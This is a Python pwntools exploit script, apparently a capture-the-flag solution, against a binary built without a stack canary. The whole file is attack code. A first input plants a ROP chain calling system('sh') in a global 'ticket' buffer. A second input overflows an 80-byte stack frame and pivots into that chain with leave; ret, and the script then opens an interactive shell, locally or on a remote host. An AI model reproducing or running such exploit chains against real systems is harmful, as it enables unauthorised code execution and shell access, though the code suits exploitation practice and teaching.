from pwn import *
from sys import argv
from os.path import isfile

try:
  target = sys.argv[1]
  if not isfile(target):
    print(f'[!] {target}: not found or not a file.')
    exit(1)
except IndexError:
  print(f'[!] target binary not supplied.')
  exit(1)

elf = context.binary = ELF(target, checksec=False)

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([target] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    if len(argv) != 4:
      print(f'[!] host IP and port not supplied.')
      exit(1)
    return remote(argv[2], argv[3], *a, **kw)
  else:
    return process([target] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

##### settings #####

#context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

##### template ends #####

rop = ROP(elf)

# ===========================================================
#          EXPLOIT GOES HERE
# ===========================================================
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      No canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    Stripped:   No
p = start()

ticket_addr = elf.sym['ticket']
leave_ret = rop.find_gadget(["leave", "ret"])[0]  
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0] 
ret_gadget = rop.find_gadget(["ret"])[0]  
system_plt = elf.sym['system'] # can also be elf.plt['system']

offset = 80 # as `_BYTE buf[72]; // [rsp+0h] [rbp-50h] BYREF` -> 0x50 == 80

bss_address = ticket_addr + 40 # points to sh

rop_chain = p64(pop_rdi_ret)  # 8
rop_chain += p64(bss_address) # 16
rop_chain += p64(ret_gadget)  # 24
rop_chain += p64(system_plt)  # 32
bin_sh = b'sh\x00' # 40

payload1 = b'A' * 8 + rop_chain + bin_sh # 'A'*8 for unused rbp, for payload2 `leave; ret`

p.sendafter(b'> ', payload1)

payload2 = b'A' * offset
payload2 += p64(ticket_addr)
payload2 += p64(leave_ret)

p.sendafter(b'>> ', payload2)
p.interactive()
